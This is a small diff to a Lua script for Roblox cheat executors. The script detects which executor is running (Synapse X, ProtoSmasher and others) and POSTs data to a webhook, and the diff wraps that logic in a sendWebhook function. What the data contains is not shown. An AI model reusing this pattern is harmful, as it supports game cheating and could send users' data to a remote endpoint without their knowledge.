@@ -1,3 +1,5 @@
+function sendWebhook(webhook, message)
+
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
@@ -38,4 +40,5 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = webh, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+end
 end
